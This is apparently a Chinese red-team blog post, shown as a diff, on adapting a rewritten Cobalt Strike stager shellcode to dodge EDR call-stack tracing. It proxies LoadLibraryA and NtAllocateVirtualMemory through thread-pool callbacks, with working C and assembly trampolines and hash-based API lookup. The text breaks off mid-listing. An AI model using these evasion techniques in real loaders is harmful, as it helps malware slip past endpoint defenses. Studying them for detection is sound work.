@@ -1,0 +1,103 @@
+## 1\. 概述
+最近学习了下 BRC4 作者1月发表的博客 [Hiding In PlainSight - Indirect Syscall is Dead! Long
+Live Custom Call Stacks](https://0xdarkvortex.dev/hiding-in-plainsight/)
+（以下称原文章），原文章讲述了利用回调函数和通过少量汇编代码修改堆栈来绕过 EDR 的一些技巧，刚好前几天尝试重写了 CS 的
+shellcode，今天打算用这篇文章里提到的一些技术来改造下之前写的 shellcode，算是之前 [CS 4.7 Stager 逆向及
+Shellcode 重写 - 先知社区](https://xz.aliyun.com/t/12194) 的一个续篇。
+## 2\. EDR 的检测点
+一些 EDR 通过用户态 hook 或 ETW 对敏感 API 的调用进行堆栈追踪，通过回溯堆栈中的返回地址以捕获 Shellcode：
+    |-----------Top Of The Stack-----------|
+    |                                      |
+    |                                      |
+    |--------------------------------------|
+    |------Stack Frame of LoadLibrary------|
+    |     Return address of RX on disk     |
+    |                                      |
+    |----------Stack Frame of RX-----------|   TpPostWork -> RtlUserThreadStart
+第三个参数是回调函数的参数，在原文章中是 wininet.dll，我们需要将 wininet.dll 作为参数传递给我们的 LoadLibraryA
+函数。但是，TpAllocWork 函数的第二个参数类型 PTP_WORK_CALLBACK 具有如下结构：
+    VOID CALLBACK WorkCallback(
+        PTP_CALLBACK_INSTANCE Instance,
+        PVOID Context,
+        PTP_WORK Work
+    );
+这会导致参数无法正确地传递给 LoadLibraryA，如下，wininet.dll 被赋值给了 RDX 寄存器，在x64架构中，RDX
+被用作函数传参时的第二个参数，然而，LoadLibraryA 函数并没有第二个参数！
+### 3.1 替换 LoadLibraryA
+在上一节中我们提到，使用 TpAllocWork 函数无法正确地将参数 wininet.dll 传递给 LoadLibraryA
+函数，原作者在此处使用的技巧是通过汇编代码将保存在 RDX 寄存器中的参数传递给 RCX 寄存器，之后通过调用 getLoadLibraryA 函数取得
+LoadLibraryA 函数的地址保存在 RAX 寄存器中并跳转执行：
+    section .text
+    extern getLoadLibraryA
+    global WorkCallback
+    WorkCallback:
+        mov rcx, rdx
+        xor rdx, rdx
+        call getLoadLibraryA
+        jmp rax
+因为 RCX 寄存器在x64架构中被用来作为函数的第一个参数来传递，而调用函数 getLoadLibraryA 的返回值将保存在 RAX
+寄存器中，此时，RAX 寄存器中保存的即是 LoadLibraryA 函数的地址，通过 jmp 跳转执行，即可正确地将参数 wininet.dll 传递给
+LoadLibraryA 函数，getLoadLibraryA 函数如下：
+    UINT_PTR getLoadLibraryA() {
+        return (UINT_PTR)pLoadLibraryA;
+    }
+修改后的堆栈调用：
+作者给出的示例代码如下：
+    #include 
+    #include 
+    typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
+    typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
+    typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);
+    FARPROC pLoadLibraryA;
+    UINT_PTR getLoadLibraryA() {
+        return (UINT_PTR)pLoadLibraryA;
+    }
+    extern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    int main() {
+        pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
+        FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
+        FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
+        FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");
+        CHAR *libName = "wininet.dll";
+        PTP_WORK WorkReturn = NULL;
+        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, libName, NULL);
+        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
+        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
+        WaitForSingleObject((HANDLE)-1, 0x1000);
+        printf("hWininet: %p\n", GetModuleHandleA(libName));
+        return 0;
+    }
+此处作者定义了一个全局变量 pLoadLibraryA 用于调用函数 getLoadLibraryA 时取得 LoadLibraryA
+的函数地址，但是因为我们要写的是一段 shellcode，不能使用全局变量，所以我对此处的 getLoadLibraryA 函数进行了适当的修改，将
+pLoadLibrary定义为局部变量并通过函数 GetProcAddressWithHash 获取其地址：
+    EXTERN_C UINT_PTR getLoadLibraryA() {
+        FARPROC pLoadLibraryA = (FN_LoadLibraryA)GetProcAddressWithHash(0x0726774C);
+        return (UINT_PTR)pLoadLibraryA;
+    }
+而这又引入了新的问题，在调用 GetProcAddressWithHash 函数后，用于传递参数的几个寄存器的值均发生了变化，这会再次导致参数
+wininet.dll 无法正确地传递给 LoadLibraryA 函数，我在此处采用的方法是将 xmm
+寄存器作为临时传递参数的寄存器，修改后的汇编代码如下：
+    myLoadLibrary PROC
+        movq xmm3, rdx
+        xor rdx, rdx
+        call getLoadLibraryA
+        movq rcx, xmm3
+        xorps xmm3, xmm3
+        jmp rax
+    myLoadLibrary ENDP
+### 3.2 替换 VirtualAlloc
+除了对动态链接库的加载进行监测外，一些敏感 API 函数也受到 EDR 的监视，原文章以 NtAllocateVirtualMemory 为例。
+首先创建一个结构体用来保存 NtAllocateVirtualMemory 和它的参数：
+    typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
+        UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
+        HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
+        PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
+        PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
+        ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
+    } NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;
+之后，我们初始化这个结构体，将它作为指针传递给 TpAllocWork 函数调用我们的回调函数：
+    #include 
+    #include 
+    typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
+    typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
+    typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);
